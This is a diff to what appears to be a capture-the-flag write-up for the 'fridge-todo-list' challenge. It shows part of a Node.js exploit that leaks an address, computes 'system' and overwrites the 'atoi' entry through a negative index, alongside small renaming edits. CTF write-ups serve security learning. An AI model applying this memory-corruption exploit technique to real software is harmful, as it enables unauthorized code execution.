@@ -77,10 +77,11 @@ Disassembler, I determined that the `system` entry in PLT is `0x30` below
 "use strict";
 
 const assert = require("assert");
-const nc = require("./lib/netcat");
-const hex = require("./lib/hexutil");
 
-const conn = new nc("fridge-todo-list.ctfcompetition.com", 1337);
+const hex_utils = require("./lib/hex_utils");
+const net_utils = require("./lib/net_utils");
+
+const conn = new net_utils("fridge-todo-list.ctfcompetition.com", 1337);
 
 (async () => {
     // Log in as (fake) root
@@ -100,7 +101,7 @@ const conn = new nc("fridge-todo-list.ctfcompetition.com", 1337);
     const i = data.indexOf("\n\n");
     assert(i !== -1);
     data = data.slice(0, i);
-    hex.add(data, 0x30);
+    hex_utils.add_carry(data, 0x30);
 
     // Overwrite "atoi" with "system", corrupting "open" on the way, I don't
     // need "open" anymore, so it's OK
@@ -111,7 +112,9 @@ const conn = new nc("fridge-todo-list.ctfcompetition.com", 1337);
     conn.write_line("-4");
 
     await conn.read_until("TODO?");
-    conn.write("A".repeat(8)); conn.write(data); conn.write("\n");
+    conn.write_bytes("A".repeat(8));
+    conn.write_bytes(data);
+    conn.write_bytes("\n");
 
     // List directory
     await conn.read_until(">");
@@ -161,4 +164,4 @@ is a privilege escalation vulnerability in the `beep` utility. Although I
 managed to understand how Holey Beep works, I didn't manage to complete this
 quest...
 
-I will be back. I will.
+I will be back... Next year...
